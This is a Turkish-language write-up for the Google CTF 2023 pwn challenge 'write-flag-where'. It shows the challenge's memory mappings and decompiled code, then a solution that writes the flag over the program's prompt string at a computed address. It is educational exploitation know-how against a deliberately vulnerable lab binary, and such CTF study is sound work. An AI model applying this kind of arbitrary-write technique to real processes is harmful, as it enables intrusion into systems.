# Google CTF 2023

## PWN

### WRITE-FLAG-WHERE

#### Çözüm

Programı açtığımızda bizden bir adres ve uzunluk istemektedir ve temin ettiğimiz adrese, temin ettiğimiz karakter sayısınca aradığımız FLAG'i yazacağını söylemektedir. Bunun ise bir döngü içerisinde yapıldığını görüyoruz.
```
== proof-of-work: disabled ==
This challenge is not a classical pwn
In order to solve it will take skills of your own
An excellent primitive you get for free
Choose an address and I will write what I see
But the author is cursed or perhaps it's just out of spite
For the flag that you seek is the thing you will write
ASLR isn't the challenge so I'll tell you what
I'll give you my mappings so that you'll have a shot.
56454b4d0000-56454b4d1000 r--p 00000000 00:11e 810424                    /home/user/chal
56454b4d1000-56454b4d2000 r-xp 00001000 00:11e 810424                    /home/user/chal
56454b4d2000-56454b4d3000 r--p 00002000 00:11e 810424                    /home/user/chal
56454b4d3000-56454b4d4000 r--p 00002000 00:11e 810424                    /home/user/chal
56454b4d4000-56454b4d5000 rw-p 00003000 00:11e 810424                    /home/user/chal
56454b4d5000-56454b4d6000 rw-p 00000000 00:00 0 
7f7529e87000-7f7529e8a000 rw-p 00000000 00:00 0 
7f7529e8a000-7f7529eb2000 r--p 00000000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f7529eb2000-7f752a047000 r-xp 00028000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f752a047000-7f752a09f000 r--p 001bd000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f752a09f000-7f752a0a3000 r--p 00214000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f752a0a3000-7f752a0a5000 rw-p 00218000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f752a0a5000-7f752a0b2000 rw-p 00000000 00:00 0 
7f752a0b4000-7f752a0b6000 rw-p 00000000 00:00 0 
7f752a0b6000-7f752a0b8000 r--p 00000000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f752a0b8000-7f752a0e2000 r-xp 00002000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f752a0e2000-7f752a0ed000 r--p 0002c000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f752a0ee000-7f752a0f0000 r--p 00037000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f752a0f0000-7f752a0f2000 rw-p 00039000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fff2b6cf000-7fff2b6f0000 rw-p 00000000 00:00 0                          [stack]
7fff2b7be000-7fff2b7c2000 r--p 00000000 00:00 0                          [vvar]
7fff2b7c2000-7fff2b7c4000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```
Programı decompile ettiğimizde çok daha basit bir şekilde görebiliyoruzki program sürekli olarak adresi istediği string'i print etmektedir. *Give me an address...* 

```c
while( true ) {	
	dprintf(var_14h,"Give me an address and a length just so:\n<address> <length>\nAnd I\'ll write it wherever you want it to go.\nIf an exit is all that you desire\nSend me nothing and I will happily expire\n");	
	buf = (char *)0x0;	
	var_70h = 0;	
	var_68h = 0;	
	var_60h = 0;	
	var_58h = 0;	
	var_50h = 0;	
	var_48h = 0;	
	var_40h = 0;	
	var_1ch = read(var_14h, &buf, 0x40);	
	iVar1 = __isoc99_sscanf(&buf, "0x%llx %u", (int64_t)&nbytes + 4, &nbytes);	
	if ((iVar1 != 2) || (0x7f < (uint32_t)nbytes)) break;	
	fd = open("/proc/self/mem", 2);	
	lseek64(fd, stack0xffffffffffffffd8, 0);	
	write(fd, flag, (uint32_t)nbytes);
	close(fd);
	}
exit(0);
dprintf(var_14h, "Somehow you got here??\n");
uVar2 = abort();
```

Programın içinde bu yazının bulunduğu bölgeyi buluyup, oraya Flag'ı yazdırırsak, program "*Give me an address...*" yazısı yerine Flag'ı yazdıracaktır.

Bunun için programın içinde bu string'i arıyoruz ve **0x21E0** offsetinde olduğunu görüyoruz.

Daha sonra bize verdiği main adresinin üstüne bu offset'i eklediğimizde program bize Flag'ı veriyor. 

```
Give me an address and a length just so:
<address> <length>
And I'll write it wherever you want it to go.
If an exit is all that you desire
Send me nothing and I will happily expire
0x56454B4D21E0 120
CTF{[REDACTED]}
```
